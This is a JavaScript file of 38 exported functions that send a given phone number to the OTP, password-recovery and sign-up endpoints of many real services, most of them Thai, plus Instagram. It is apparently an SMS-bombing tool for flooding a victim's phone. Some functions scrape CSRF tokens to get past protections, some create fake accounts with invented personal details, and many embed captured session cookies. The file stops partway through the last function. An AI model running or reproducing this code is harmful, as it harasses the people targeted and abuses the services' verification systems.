import axios from "axios";

export const api1 = async (phone) => {
  const url = "https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp";
  const headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
  };
  const data = { mobile_phone_no: phone };
  
  await axios.post(url, data, { headers });
};

export const api2 = async (phone) => {
  const url = "https://pygw.csne.co.th/api/gateway/truewalletRequestOtp";
  const headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Cookie": "pygw_csne_coth=91207b7404b2c71edd9db8c43c6d18c23949f5ea"
  };
  const data = `transactionId=b05a66a7e9d0930cbda4d78b351ea6f7&phone=${phone}`;
  
  await axios.post(url, data, { headers });
};

export const api3 = async (phone) => {
  const url = "https://api2.1112.com/api/v1/otp/create";
  const headers = {
    "Content-Type": "application/json;charset=UTF-8",
    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
  };
  const data = {
    phonenumber: phone,
    language: "th"
  };
  
  await axios.post(url, { headers, data });
};

export const api4 = async (phone) => {
  const url = "https://api-sso.ch3plus.com/user/request-otp";
  const headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
  };
  const data = {
    tel: phone,
    type: "login"
  };
  
  await axios.post(url, data, { headers });
};

// Adding the new API calls from Python functions

export const api5 = async (phone) => {
  const url = "https://www.instagram.com/accounts/account_recovery_send_ajax/";
  const headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
    "x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"
  };
  const data = `email_or_username=${phone}&recaptcha_challenge_field=`;
  
  await axios.post(url, data, { headers });
};

export const api6 = async (phone) => {
  const url = "https://api.freshket.co/baseApi/Users/RequestOtp";
  const headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Content-Type": "application/json;charset=UTF-8"
  };
  const data = {
    isDev: "false",
    language: "th",
    phone: `+66${phone.slice(1)}`
  };
  
  await axios.post(url, data, { headers });
};

export const api7 = async (phone) => {
  const url = "https://api.true-shopping.com/customer/api/request-activate/mobile_no";
  const headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
  };
  const data = { username: phone };
  
  await axios.post(url, data, { headers });
};

export const api8 = async (phone) => {
  const url = `https://hdmall.co.th/phone_verifications?express_sign_in=1&mobile=${phone}`;
  const headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
  };

  try {
    const response = await axios.get(url, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api9 = async (phone) => {
  const url = "https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp";
  const data = { mobile_phone_no: phone };
  const headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api10 = async (phone) => {
  const url = `https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=0${phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2`;
  const headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
  };

  try {
    const response = await axios.get(url, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api11 = async (phone) => {
  const url = "https://www.mtsblockchain.com/mgb-api/user/register/reqotp";
  const data = { mobile: phone };
  const headers = {
    "Content-Type": "application/json",
    "Cookie": "_ga=GA1.2.1476569446.1657959172; _gid=GA1.2.587325211.1657959172; _gat_gtag_UA_230676474_1=1; connect.sid=s%3Avu1rVQbmGkMrSzQS7GYQ-y4VHMxHdmH7.zuhlp%2BBtukL2ksityudE9OTqdUH5G3dk3XHm3zNEHIs; cookie_policy_accepted=1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api12 = async (phone) => {
  const url = "https://ocs-prod-api.makroclick.com/next-ocs-member/user/register";
  const data = {
    username: phone,
    password: "6302814184624az",
    name: "0903281894",
    provinceCode: "28",
    districtCode: "393",
    subdistrictCode: "3494",
    zipcode: "40260",
    siebelCustomerTypeId: "710",
    acceptTermAndCondition: "true",
    hasSeenConsent: "false",
    locale: "th_TH"
  };

  try {
    const response = await axios.post(url, data);
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api13 = async (phone) => {
  const url = "https://api.ulive.youpik.com/api-base/sms/sendCode";
  const data = `phone=${phone.slice(1)}&type=1`;
  const headers = {
    "authorization": "Basic d2ViQXBwOndlYkFwcA==",
    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api14 = async (phone) => {
  const url = "https://pygw.csne.co.th/api/gateway/truewalletRequestOtp";
  const data = `transactionId=b05a66a7e9d0930cbda4d78b351ea6f7&phone=${phone}`;
  const headers = {
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "cookie": "pygw_csne_coth=91207b7404b2c71edd9db8c43c6d18c23949f5ea"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api15 = async (phone) => {
  const url = "https://vaccine.trueid.net/vacc-verify/api/getotp";
  const data = { msisdn: phone, function: "enroll" };
  const headers = {
    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "content-type": "application/json;charset=UTF-8",
    "accept": "application/json, text/plain, */*",
    "cookie": "_gcl_au=1.1.628507904.1657519113; _cbclose=1; _cbclose26068=1; _uid26068=51BC4E60.1; _ctout26068=1; verify=test; _ga=GA1.2.682897436.1657519114; _gid=GA1.2.1721036016.1657519114; _gat_UA-86733131-1=1; _fbp=fb.1.1657519114976.1588263006; afUserId=64e5ba75-c9e2-4e45-aa62-7f5318ec6d9c-p; AF_SYNC=1657519116965"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api16 = async (phone) => {
  const url = "https://srfng.ais.co.th/login/sendOneTimePW";
  const session = await axios.create();
  const tokenResponse = await session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", {
    headers: {
      "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
    }
  });

  const token = tokenResponse.data.match(/<input type="hidden" id='token' value="(.*)">/)[1];

  const data = `msisdn=66${phone.slice(1)}&serviceId=AISPlay&accountType=all&otpChannel=sms`;
  const headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "authorization": `Bearer ${token}`
  };

  try {
    const response = await session.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api17 = async (phone) => {
  const url = "https://www.kaitorasap.co.th/api/index.php/send-otp-login/";
  const data = `phone_number=${phone}&lag=`;
  const headers = {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Cookie": "PHPSESSID=080ugg4928ulkhj6kaggiqkvd1; _ga=GA1.3.1856390916.1657557339; _gid=GA1.3.1103002458.1657557339; _gat_gtag_UA_141105037_1=1; G_ENABLED_IDPS=google"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api18 = async (phone) => {
  const url = `https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone=${phone}`;
  const headers = {
    "accept": "application/json, text/javascript, */*; q=0.01",
    "x-requested-with": "XMLHttpRequest",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "cookie": "referer=https%3A%2F%2Fwww.konvy.com%2Fm%2F;PHPSESSID=vnqlo8v638jofnb15arplijj3i;k_privacy_state=true;referer=https%3A%2F%2Fwww.konvy.com%2Fm%2Flogin.php;_gcl_au=1.1.531291202.1661272286;_fbp=fb.1.1661272286002.265391910;_gid=GA1.2.960487052.1661272286;_gat_UA-28072727-2=1;_tt_enable_cookie=1;_ttp=d640ab77-0c19-4578-855d-4fb1ceda3f0a;f34c_new_user_view_count=%7B%22count%22%3A2%2C%22expire_time%22%3A1661358684%7D;_ga_Z9S47GV47R=GS1.1.1661272286.1.1.1661272293.53.0.0;_ga=GA1.2.1347355119.1661272286"
  };

  try {
    const response = await axios.get(url, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api19 = async (phone) => {
  const url = "https://api2.1112.com/api/v1/otp/create";
  const data = { phonenumber: phone, language: "th" };
  const headers = {
    "content-type": "application/json;charset=UTF-8",
    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api20 = async (phone) => {
  const url = "https://www.msport1688.com/auth/otp_sender";
  const data = `phone=${phone}&otp=&password=&bank=&bank_number=&full_name=&ref=`;
  const headers = {
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "cookie": "msp_ss_client=4a4nipncnp9l5ced7k5v7rrs9hdnscda;_ga=GA1.1.72563414.1657611524;_ga_1YLLB0C2FF=GS1.1.1657611524.1.1.1657611527.0"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api21 = async (phone) => {
  const url = "https://ep789bet.net/auth/send_otp";
  const data = `phone=${phone}&otp=&password=&bank=&bank_number=&full_name=&ref=`;
  const headers = {
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "user-agent": "ep789bet=g9b6cbooof7sq9tmmdtside6s1topdus;__cf_bm=N34Ldd3PZGzyar210NA3MW6tlk6DVyL7TRWX9siAsXk-1657612222-0-AchySBWuKW05LLldbYqjOGsQ9fG8ijO20enZMUqVHANUif9L3qqazpIcC5nC+tUMIfCoSH575g2k16EyMHk43KcE5tZmJTd+lHogz8Rpd3lKbU3eUD1RsrUmgeJwbddVBQ=="
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api22 = async (phone) => {
  const url = "https://www.theconcert.com/rest/request-otp";
  const data = {
    mobile: phone,
    country_code: "TH",
    lang: "th",
    channel: "call",
    digit: 4
  };
  const headers = {
    "content-type": "application/json;charset=UTF-8",
    "accept": "application/json, text/plain, */*",
    "user-agent": generate_user_agent(),
    "x-requested-with": "XMLHttpRequest",
    "x-csrf-token": "d6VfYNo3-RJK5IK0axoCE7KLIAPbW9K0IbL8",
    "x-xsrf-token": "b2b9a4f732d05668c61e64f836417f67/iS0TaMFdXciRQYns4jNXpeVYy3DlvGY6ML+q8oquXvseUvcnIelmUwwR9/wJHKHjGKfN0+WS9orN1zdtt4J3I72qJ3x4Va07eBC0isPMu4ktiZw5DvLcobqJ9l39rFP"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api23 = async (phone) => {
  const url = "https://www.jdbaa.com/api/otp-not-captcha";
  const data = {
    phone_number: phone,
    user_id: `ak${phone}`
  };
  const headers = {
    "content-type": "application/json; charset=UTF-8",
    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "cookie": "_ga=GA1.2.139524076.1653888756;_hjSessionUser_1879787=eyJpZCI6IjczNjVhMTYxLTFkNzktNWVjYS04N2M4LTc3ZTk3ODUyY2U3ZiIsImNyZWF0ZWQiOjE2NTM4ODg3NTc4ODksImV4aXN0aW5nIjp0cnVlfQ==;_fw_crm_v=b55243cc-06b2-4f25-ca32-2a7634301a95;connect.sid=s%3AiV4V1-65FA5rpJyEObOITUh2fyDcYhen.aclXEUqD4Qe5nlUYVG0mb1zIAC4OuxP4FWCX6%2B8E9WU;io=c7ilAXG_QnIDDz0xAKH5;countdown_lotto_th=345759;_gid=GA1.2.626569110.1657612643;_gat_gtag_UA_139533742_1=1;_hjIncludedInSessionSample=0;_hjSession_1879787=eyJpZCI6ImVjMzQ5NWNiLTIwOGQtNGViYS1hNmY3LTY2ZDVhM2JhMGNmZCIsImNyZWF0ZWQiOjE2NTc2MTI2NDUyMzEsImluU2FtcGxlIjpmYWxzZX0=;_hjAbsoluteSessionInProgress=0;modal_htd=true;_fw_crm_v=b55243cc-06b2-4f25-ca32-2a7634301a95"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api24 = async (phone) => {
  const url = "https://ocs-prod-api.makroclick.com/next-ocs-member/user/register";
  const data = {
    username: phone,
    password: "6302814184624az",
    name: "0903281894",
    provinceCode: "28",
    districtCode: "393",
    subdistrictCode: "3494",
    zipcode: "40260",
    siebelCustomerTypeId: "710",
    acceptTermAndCondition: "true",
    hasSeenConsent: "false",
    locale: "th_TH"
  };

  try {
    const response = await axios.post(url, data);
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api25 = async (phone) => {
  const url = "https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp";
  const data = `dCard=1358231116147&Mobile=${phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER`;
  const headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api26 = async (phone) => {
  const url = "https://www.tgfone.com/signin/verifylforgot";
  const data = `forgot_name=${phone}`;
  const headers = {
    "user-agent": generate_user_agent(),
    "content-type": "application/x-www-form-urlencoded",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "cookie": "_gcl_au=1.1.491392800.1657955935;_gid=GA1.2.1244336456.1657955937;_fbp=fb.1.1657955937500.30844796;G_ENABLED_IDPS=google;PHPSESSID=d42c517cc5234d40c44310c39e2212d464e2b18a;_ga_1QLSWVZFZ2=GS1.1.1657955937.1.1.1657956238.0;_ga=GA1.2.160165897.1657955937;_gat_gtag_UA_163796127_1=1"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api27 = async (phone) => {
  const url = "https://app.khonde.com/requestOTP/";
  const session = await axios.create();
  const apiWeb = await session.get('https://app.khonde.com/register', {
    headers: {
      "User-Agent": generate_user_agent()
    }
  });

  const token = apiWeb.data.match(/<meta name="csrf-token" content="(.*?)">/)[1];

  try {
    const response = await session.get(`https://app.khonde.com/requestOTP/${phone}`, {
      headers: {
        "X-XSRF-TOKEN": token,
        "User-Agent": generate_user_agent(),
        "Cookie": "_gid=GA1.2.1429375693.1657960248; _gac_UA-74972330-26=1.1657960248.CjwKCAjww8mWBhABEiwAl6-2RVYe9XsjIIksM_BccLyzFFDX8T_YVTKKPOe2Q0BPyoTwjuzYwh6EyBoCN7wQAvD_BwE"
      }
    });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api28 = async (phone) => {
  const url = "https://gamingnation.dtac.co.th/api/otp/request";
  const data = {
    template: "register",
    phone_no: phone
  };
  const headers = {
    "User-Agent": generate_user_agent(),
    "Cookie": "auth.strategy=local; i18n_redirected=th; _gcl_au=1.1.265124296.1661273714; _ga=GA1.3.1857579863.1661273717; _gid=GA1.3.1514915490.1661273717; _fbp=fb.2.1661273718125.787639535; _tt_enable_cookie=1; _ttp=7e4a2162-1ab4-41a0-8b77-e1188cda6a3a; _hjSessionUser_2510409=eyJpZCI6ImVkM2I0OWU2LTBjODQtNWU1ZC04OWIzLTZlMjk5NGFhMWE3NCIsImNyZWF0ZWQiOjE2NjEyNzM3MTc5MzcsImV4aXN0aW5nIjpmYWxzZX0="
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api29 = async (phone) => {
  const url = "https://api-sso.ch3plus.com/user/request-otp";
  const data = { tel: phone, type: "login" };
  const headers = {
    "User-Agent": generate_user_agent()
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api30 = async (phone) => {
  const url = "https://api.cmtrade.com/api/v2/account/sms/code";
  const data = {
    phone: phone,
    countryCode: "66",
    countryId: "Thailand",
    type: "mobile"
  };
  const headers = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    "cookie": "utm_source=GoogleSEM3; _ga=GA1.2.217747635.1664304861; _gac_UA-204031796-1=1.1664304861.EAIaIQobChMIkIuq29K1-gIVwRErCh1xrgqNEAAYAiAAEgLxKPD_BwE; _gid=GA1.2.2032034977.1664304861; _gat_gtag_UA-204031796_1=1; _gac_UA-204031796-2=1.1664304861.EAIaIQobChMIkIuq29K1-gIVwRErCh1xrgqNEAAYAiAAEgLxKPD_BwE"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api31 = async (phone) => {
  const url = "https://www.bigthailand.com/authentication-service/user/OTP";
  const session = await axios.create();
  const apiWeb = await session.get('https://www.bigthailand.com/login', {
    headers: {
      "user-agent": generate_user_agent()
    }
  });

  const token = apiWeb.data.match(/input name="auth\._token\.local" value="(.*?)"/)[1];

  const data = {
    locale: "th",
    phone: `+66${phone.slice(1)}`,
    email: "asjfgyfg2@hbsfsdf.sdf",
    userParams: {
      buyerName: "sfiushjud fusdhfus",
      activateLink: "www.google.com"
    }
  };
  
  const headers = {
    "user-agent": generate_user_agent(),
    "authorization": `Bearer ${token}`,
    "content-type": "application/json;charset=UTF-8",
    "cookie": `auth.strategy=local; auth._token.local=Bearer%20${token}`
  };

  try {
    const response = await session.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api32 = async (phone) => {
  const url = "https://cognito-idp.ap-southeast-1.amazonaws.com/";
  const data = {
    ClientId: "6g47av6ddfcvi06v4l186c16d6",
    Username: `+66${phone.slice(1)}`,
    Password: "098098Az",
    UserAttributes: [
      { Name: "name", Value: "Dbdh" },
      { Name: "birthdate", Value: "2005-01-01" },
      { Name: "gender", Value: "Male" },
      { Name: "phone_number", Value: `+66${phone.slice(1)}` },
      { Name: "custom:phone_country_code", Value: "+66" },
      { Name: "custom:is_agreement", Value: "true" },
      { Name: "custom:allow_consent", Value: "true" },
      { Name: "custom:allow_person_info", Value: "true" }
    ],
    ValidationData: []
  };
  
  const headers = {
    "user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
    "content-type": "application/x-amz-json-1.1",
    "x-amz-target": "AWSCognitoIdentityProviderService.SignUp",
    "x-amz-user-agent": "aws-amplify/0.1.x js",
    "referer": "https://www.bugaboo.tv/members/signup/phone"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api33 = async (phone) => {
  const url = "https://www.vegas77slots.com/auth/send_otp";
  const data = `phone=${phone}&otp=&password=&bank=&bank_number=&full_name=&ref=21076`;
  const headers = {
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "cookie": "vegas77slots=pj5kj4ovnk2fao1sbaid2eb76l1iak7b"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api34 = async (phone) => {
  const url = "https://ocs-prod-api.makroclick.com/next-ocs-member/user/register";
  const data = {
    username: phone,
    password: "6302814184624az",
    name: "0903281894",
    provinceCode: "28",
    districtCode: "393",
    subdistrictCode: "3494",
    zipcode: "40260",
    siebelCustomerTypeId: "710",
    acceptTermAndCondition: "true",
    hasSeenConsent: "false",
    locale: "th_TH"
  };

  try {
    const response = await axios.post(url, data);
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api35 = async (phone) => {
  const url = "https://www.msport1688.com/auth/otp_sender";
  const data = `phone=${phone}&otp=&password=&bank=&bank_number=&full_name=&ref=`;
  const headers = {
    "content-type": "application/x-www-form-urlencoded",
    "cookie": "msp_ss_client=nin5curi8elq4364dlslffs5ennnv8oo; _ga=GA1.1.867791689.1664019874; _ga_1YLLB0C2FF=GS1.1.1664019873.1.1.1664019875.0.0.0",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api36 = async (phone) => {
  const url = "https://api.1112delivery.com/api/v1/otp/create";
  const data = {
    phonenumber: phone,
    language: "th"
  };
  const headers = {
    "content-type": "application/json;charset=UTF-8",
    "user-agent": generate_user_agent(),
    "accept": "application/json, text/plain, */*"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api37 = async (phone) => {
  const url = `https://app.iship.cloud/api/ant/request-otp/${phone}`;
  const headers = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    "cookie": "_fbp=fb.1.1664699330289.47112595; XSRF-TOKEN=eyJpdiI6Ijk3cVRMUndzZ2FUME8wV2VzRXFaWWc9PSIsInZhbHVlIjoiQjRkNzlNYXR2TWtSWmNySlFYVjBoQk80RGJMR215RXVFUjRuMTFNYm5ocGRDRmNGcHNjWmpOeUdnOWlPbmFhVXA5eG1LUlB2SVZEMjRFWEVITTRZV1hzZUtZenArenZjK0R3UE5OTUdTQkVWUG1tYmkrTG1NWWFiTUZOZ1NRMlIiLCJtYWMiOiI3Y2M1OGJkMzg2MzZkZDYwNjlmNjNkMmFkYWZlZDVkNjliZGJjMjUwN2MyMjJmYzgxODE3ZGYxOWY1NWU4MzhlIiwidGFnIjoiIn0%3D; iship_session=eyJpdiI6IjdueEZQTU5Kc0FXZ0hjeVF0L2s2WVE9PSIsInZhbHVlIjoidHNzZ1RINDhta1BnUkFic29hdFlMNU8zVWt0MGZYbUVMb1Q0ZjM0OVR5cFlSbE01NlNuMWRoeGF4SldiVHN3U3JFZWg5dnJvMEZHbnF6cnlNdG45SmZjSGxqRkNRN0w0T3oyclBHc09ZM2svd3VZZkl4TG9NRHFLMTIxeGhvd2oiLCJtYWMiOiJhMTBjZThjNGU5M2Y0NjM1MTQ4ZTI4MGFmMzkxMmQ4ZmY0NjljNGM5YjBkZWZkMGIxYTM5Y2Y5MDgyNWZkOTk1IiwidGFnIjoiIn0%3D"
  };

  try {
    const response = await axios.get(url, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api38 = async (phone) => {
  const url = "https://chobrod.com/register";
